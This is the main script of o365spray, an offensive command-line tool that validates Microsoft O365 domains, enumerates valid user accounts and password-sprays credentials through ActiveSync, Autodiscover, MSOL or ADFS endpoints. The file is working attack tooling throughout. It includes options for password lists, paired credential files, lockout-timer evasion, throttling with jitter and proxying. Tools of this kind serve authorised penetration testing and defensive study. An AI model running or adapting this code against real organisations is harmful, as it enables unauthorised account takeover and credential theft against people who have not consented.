#!/usr/bin/env python3

import sys
import signal
import asyncio
import argparse
from pathlib import Path
from core.utils.helper import *
from core.handlers.sprayer import *
from core.handlers.validator import *
from core.handlers.enumerator import *


__version__ = '1.3.7'

# Signal handler for Enum routines
def enum_signal_handler(signal, frame):
    enum.shutdown(key=True)
    print("\n[+] Valid Accounts: %d" % len(enum.valid_accts))
    sys.exit()

# Signal handler for Spray routines
def spray_signal_handler(signal, frame):
    spray.shutdown(key=True)
    print("\n[+] Valid Credentials: %d" % len(spray.valid_creds))
    sys.exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Microsoft O365 User Enumerator and Password Sprayer -- v{VERS}".format(VERS=__version__)
    )

    # Target domain
    parser.add_argument(
        "-d",
        "--domain",
        type=str,
        help="Target domain"
    )

    # Type of scan to perform
    parser.add_argument(
        "--validate",
        action="store_true",
        help="Perform domain validation only."
    )
    parser.add_argument(  # Can be used with spray
        "--enum",
        action="store_true",
        help="Perform username enumeration."
    )
    parser.add_argument(  # Can be used with enum
        "--spray",
        action="store_true",
        help="Perform password spraying."
    )

    # Username(s)/Password(s) to be used during enum/spray
    parser.add_argument(
        "-u",
        "--username",
        type=str,
        help="Username(s) delimited using commas."
    )
    parser.add_argument(
        "-p",
        "--password",
        type=str,
        help="Password(s) delimited using commas."
    )
    parser.add_argument(
        "-U",
        "--userfile",
        type=str,
        help="File containing list of usernames."
    )
    parser.add_argument(
        "-P",
        "--passfile",
        type=str,
        help="File containing list of passwords."
    )
    parser.add_argument(
        "--paired",
        type=str,
        help="File containing list of username:password format."
    )

    # Lockout policy
    parser.add_argument(
        "-c",
        "--count",
        type=int,
        help="Number of password attempts to run before resetting lockout timer. Default: 1",
        default=1
    )
    parser.add_argument(
        "-l",
        "--lockout",
        type=float,
        help="Lockout policy reset time (in minutes). Default: 15 minutes",
        default=15.0
    )

    # Scan specifications
    parser.add_argument(
        "--validate-type",
        type=str.lower,
        default='getuserrealm',
        choices=('openid-config', 'getuserrealm'),
        help="Specify which validation module to use. Default: getuserrealm"
    )
    parser.add_argument(
        "--enum-type",
        type=str.lower,
        default='office',
        choices=('office', 'activesync', 'onedrive'),
        help="Specify which enum module to use. Default: Office"
    )
    parser.add_argument(
        "--spray-type",
        type=str.lower,
        default='activesync',
        choices=('activesync', 'autodiscover', 'msol', 'adfs'),
        help="Specify which spray module to use. Default: ActiveSync"
    )
    parser.add_argument(
        "--adfs",
        type=str,
        help="URL of target ADFS login page for password spraying."
    )
    parser.add_argument(
        "--rate",
        type=int,
        help="Number of concurrent connections during enumeration and spraying. Default: 10",
        default=10
    )
    # Note: This is currently only applicable to the `msol` spray module
    parser.add_argument(
        "--safe",
        type=int,
        help="Terminate scan if `N` locked accounts are observed. Default: 10",
        default=10
    )

    parser.add_argument(
        '-s',
        "--sleep",
        type=int,
        help="Throttle subsequent attempts every # seconds, can be randomized by passing the value 'random' (between 1sec and 20 mins) - default is 0",
        default=0
    )

    parser.add_argument(
        '-j',
        "--jitter",
        type=int,
        help="Jitter among subsequent tries. Jitter extends sleep period by percanted given (0-100). Default: no jitter.",
        default=0
    )

    # HTTP configurations
    parser.add_argument(
        "--timeout",
        type=int,
        help="Request timeout in seconds. Default: 25",
        default=25
    )
    parser.add_argument(
        "--proxy",
        type=str,
        help="Proxy to pass traffic through (e.g. http://127.0.0.1:8080)."
    )

    # Misc config
    parser.add_argument(
        "--output",
        type=str,
        help="Output directory for results. Default: Current directory",
        default="."
    )
    parser.add_argument(
        "--version",
        action="store_true",
        help="Print the tool version."
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Debug output"
    )

    args = parser.parse_args()


    # Print the tool version and exit
    if args.version:
        print("o365spray %s" % __version__)
        sys.exit()


    # Ensure a domain has been provided
    if not args.domain:
        parser.error("-d/--domain is required.")

    # If enumerating users make sure we have a username or username file
    if args.enum and (not args.username and not args.userfile):
        parser.error("-u/--username or -U/--userfile is required when performing user enumeration via -e/--enum.")

    # If password spraying make sure we have username(s) and password(s)
    if args.spray and (((not args.username and not args.userfile) or (not args.password and not args.passfile)) and not args.paired):
        parser.error("[-u/--username or -U/--userfile] and [-p/--password or -P/--passfile] OR " +
                     "--paired are required when performing password spraying via -s/--spray.")

    start  = time.time()
    helper = Helper()

    # Print banner with config settings
    helper.banner(args, __version__)

    # Clean output dir string
    args.output = args.output.rstrip('/')


    # Perform domain validation
    # Note: This should only occur if the user has not excplicitly specified to spray ADFS
    #       or the user has specified to only validate the domain
    if not args.adfs or args.validate:

        # Validate the domain
        print("[*] Performing O365 validation for: %s\n" % args.domain)
        validator    = Validator(args=args)
        (valid,adfs) = validator.validate()
        if not valid or args.validate:
            (args.enum, args.spray) = (False, False)


        # Handle Federated realms
        if (valid and adfs) and not args.validate:

            # Set the ADFS target as the AuthUrl provided by Microsoft's `getuserrealm`
            args.adfs = adfs

            # Note: OneDrive is currently the only valid method for ADFS enumeration - prompt
            #       the user to ask if they would like to switch if not already set
            if args.enum and args.enum_type != 'onedrive':
                prompt = "[?]\t\tWould you like to switch to OneDrive for user enumeration [Y/n] "
                resp   = helper.prompt_question(prompt)
                if resp[0] == 'y':
                    args.enum_type = 'onedrive'
                else:
                    # Disable enumeration as all other modules currently return False Positives
                    # for ADFS
                    args.enum = False

            # Note: If the user has specified to perform password spraying - prompt the user to
            #       ask if they would like to target ADFS or continue targeting Microsoft API's
            if args.spray and args.spray_type != 'adfs':
                prompt = "[?]\t\tWould you like to switch to ADFS for password spraying [Y/n] "
                resp   = helper.prompt_question(prompt)
                if resp[0] == 'y':
                    args.spray_type = 'adfs'

    # Skip domain validation and enforce ADFS enumeration/spraying when the user provides an ADFS url
    else:
        args.enum_type  = 'onedrive'
        args.spray_type = 'adfs'



    # Perform user enumeration
    if args.enum:
        # Create enum directory
        Path("%s/enum/" % args.output).mkdir(parents=True, exist_ok=True)

        loop = asyncio.get_event_loop()

        # Support both username(s) and a username file being provided
        password = "Password1" if not args.password else args.password.split(',')[0]
        userlist = []
        if args.username:
            userlist += args.username.split(',')
        if args.userfile:
            userlist += helper.get_list_from_file(args.userfile)

        print("\n[*] Performing user enumeration against %d potential users\n" % (len(userlist)))

        enum = Enumerator(
            loop=loop,
            args=args
        )

        # Add signal handler to handle ctrl-c interrupts
        signal.signal(signal.SIGINT,  enum_signal_handler)
        signal.signal(signal.SIGTERM, enum_signal_handler)

        try:
            loop.run_until_complete(enum.run(userlist, password))

            enum.shutdown()
            print("\n[+] Valid Accounts: %d" % len(enum.valid_accts))

            loop.run_until_complete(asyncio.sleep(0.250))
            loop.close()

        except KeyboardInterrupt as e:
            pass


    # Perform password spray
    if args.spray:
        # Create spray directory
        Path("%s/spray/" % args.output).mkdir(parents=True, exist_ok=True)

        loop = asyncio.get_event_loop()

        # Support both password(s) and a password file being provided
        passlist = []
        if args.password:
            passlist += args.password.split(',')
        if args.passfile:
            passlist += helper.get_list_from_file(args.passfile)

        # Use validated users if enumeration was run
        if args.enum:
            userlist = enum.valid_accts
            # Sleep before spraying when enumeration that uses authentication was used
            enum_auth = ['activesync']
            if args.enum_type in enum_auth:
                print("\n[*] Enumeration was run. Resetting lockout before password spraying.")
                print("[*] Sleeping for %.1f minutes" % (args.lockout))
                helper.lockout_reset_wait(args.lockout)

        # Handle username:password files
        elif args.paired:
            paired_list = helper.get_list_from_file(args.paired)
            userlist = [user.split(':')[0] for user in paired_list]
            passlist = [password.split(':')[1] for password in paired_list]

        else:
            # Support both username(s) and a username file being provided
            userlist = []
            if args.username:
                userlist += args.username.split(',')
            if args.userfile:
                userlist += helper.get_list_from_file(args.userfile)


        if len(userlist) < 1:
            if args.debug: print("\n[DEBUG] No users to run a password spray against.")

        else:
            print("\n[*] Performing password spray against %d users." % len(userlist))

            spray = Sprayer(
                loop=loop,
                userlist=userlist,
                args=args
            )

            # Add signal handler to handle ctrl-c interrupts
            signal.signal(signal.SIGINT,  spray_signal_handler)
            signal.signal(signal.SIGTERM, spray_signal_handler)

            try:
                if not args.paired:
                    for password_chunk in helper.get_chunks_from_list(passlist, args.count):
                        print("[*] Password spraying the following passwords: [%s]" % (
                            ", ".join("'%s'" % password for password in password_chunk))
                        )

                        # Loop through each password individually so it's easier to keep track and
                        # avoid duplicate scans once a removal condition is hit
                        for password in password_chunk:
                            loop.run_until_complete(spray.run(password))

                            # Stop if we hit our locked account limit
                            # Note: This currently only applies to the MSOL spraying module as Autodiscover
                            #       is currently showing invalid lockouts
                            if spray.lockout >= args.safe:
                                print("[!] Locked account threshold reached. Exiting...")
                                spray.shutdown()
                                break

                        # https://stackoverflow.com/a/654002
                        # https://docs.python.org/3/tutorial/controlflow.html#break-and-continue-statements-and-else-clauses-on-loops
                        # Only executed if the inner loop did NOT break
                        else:
                            # Check if we reached the last password chunk
                            if not helper.check_last_chunk(password_chunk, passlist):
                                helper.lockout_reset_wait(args.lockout)
                            continue

                        # Only executed if the inner loop DID break
                        break

                else:
                    print("[*] Password spraying using paired usernames and passwords.")

                    loop.run_until_complete(spray.run_paired(passlist))
                    # Note: Since we are pairing usernames and passwords, we can ignore the
                    #       lockout reset wait call

                spray.shutdown()
                print("\n[+] Valid Credentials: %d" % len(spray.valid_creds))

                loop.run_until_complete(asyncio.sleep(0.250))
                loop.close()

            except KeyboardInterrupt as e:
                pass


    elapsed = time.time() - start
    if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))
